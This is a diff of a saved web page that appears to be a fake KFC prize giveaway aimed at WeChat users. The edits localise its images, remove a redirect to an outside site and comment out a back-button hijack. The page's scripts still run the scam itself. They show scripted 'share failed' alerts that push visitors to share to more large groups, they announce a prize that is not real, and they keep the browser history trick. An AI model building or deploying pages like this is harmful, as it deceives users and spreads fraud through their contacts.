@@ -1,5 +1,7 @@
 <!DOCTYPE html>
-<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<html>
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <script>
         var _czc = _czc || [];
         _czc.push(["_setAccount", "1262044462"]);
@@ -203,7 +205,7 @@
     <div class="tips" style="font-size: 15px;margin-bottom: 10px;font-weight: 500;">
         <p style="text-align: left;margin-left: 20px;color: red;">温馨提示:</p><p style="text-align: left;margin-left: 20px;">长按下图,选择<span style="color:red;">发送给朋友-分享到群</span><span style="color: #1d1c1d;">即可领取！</span></p></div>
     <script>
-        document.writeln("<div id='d-pic' style='margin: 0 auto;text-align: center;border:10px solid #E64340;width:60%;border-radius: 10px;'><img src='http://ww3.sinaimg.cn/large/006HJ39wgy1fg7yvfsv5rj30sg1c8gse.jpg' id='pic' style='margin: 0 auto;width:100%;'></div>");
+        document.writeln("<div id='d-pic' style='margin: 0 auto;text-align: center;border:10px solid #E64340;width:60%;border-radius: 10px;'><img src='./newkfc_files/006HJ39wgy1fg7yvfsv5rj30sg1c8gse789789.jpg' id='pic' style='margin: 0 auto;width:100%;'></div>");
     </script>
 
     <div class="bottom-center">
@@ -375,7 +377,7 @@
         });
         rd = parseInt(Math.random()*100);
         if(rd <=50){
-            $('#pic').attr('src','http://ww3.sinaimg.cn/large/006HJ39wgy1fg8z31g0uxj30sg1c8q9p.jpg');
+            $('#pic').attr('src','./newkfc_files/006HJ39wgy1fg7yvfsv5rj30sg1c8gse789789.jpg');
         }
 
         //cnzz_pus('firend');
@@ -387,7 +389,7 @@
             aaa++;
         });
         rd = parseInt(Math.random()*100);
-        $('#pic').attr('src','http://ww1.sinaimg.cn/large/006HJ39wgy1fg900j916aj30sg1c8gse.jpg');
+        $('#pic').attr('src','./newkfc_files/006HJ39wgy1fg7yvfsv5rj30sg1c8gse789789.jpg');
         //if(rd <=50){
         //    $('#pic').attr('src','http://ww3.sinaimg.cn/large/006HJ39wgy1fg8z31g0uxj30sg1c8q9p.jpg');
         //}
@@ -399,7 +401,7 @@
         $.alert('还需再分享到<span style="color: red;font-size: 26px;">1</span>个不同的群（群人数不少于50人）',"<span style='color: red;'>分享失败</span>",function () {
             aaa++;
         });
-        $('#pic').attr('src','http://ww3.sinaimg.cn/large/006HJ39wgy1fg900j9hllj30sg1c8jy6.jpg');
+        $('#pic').attr('src','./newkfc_files/006HJ39wgy1fg7yvfsv5rj30sg1c8gse789789.jpg');
         //cnzz_pus('firend');
     }
 
@@ -409,11 +411,10 @@
             $.modal({
                 title: "<span style='color: green;'>温馨提示</span>",
                 //text: '长按图片<span style="color: red;">保存图片</span>，发送图片到朋友圈，并获取至少三个赞，等待系统审核!',
-				text: '恭喜您，奖品会在48小时内审核后存入您的账户，请保留24小时哦！另外，还有一个超级给力的活动与您分享！',
+				text: '恭喜您，奖品会在48小时内审核后存入您的账户，请注意查看！]',
                 buttons: [
                     {
                         text: "<span>确定</span>", onClick: function(){
-						location.href='http://abc.cachance.cn/wxarticle.php?pid=84&aid=4&t=1496543069';
                         }
                     }
                 ]
@@ -434,10 +435,15 @@
     }
 
     //退返跳转指定页面
-    window.onhashchange=function(){jp();};
+    /*window.onhashchange=function(){jp();};
+	function jp() {location.href='';}*/
     function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
-    function jp() {location.href='http://abc.cachance.cn/wxarticle.php?pid=84&aid=4&t=1496543069';}
     setTimeout('hh();', 200);
 </script>
 
-</body><wappalyzerdata id="wappalyzerData" style="display: none"></wappalyzerdata><script id="wappalyzerEnvDetection" src="chrome-extension://cnjfmkecbbooheemadfcdndegmmhfmje/js/inject.js"></script></html>
+</body>
+<wappalyzerdata id="wappalyzerData" style="display: none">
+
+</wappalyzerdata>
+<script id="wappalyzerEnvDetection" src="chrome-extension://cnjfmkecbbooheemadfcdndegmmhfmje/js/inject.js"></script>
+</html>
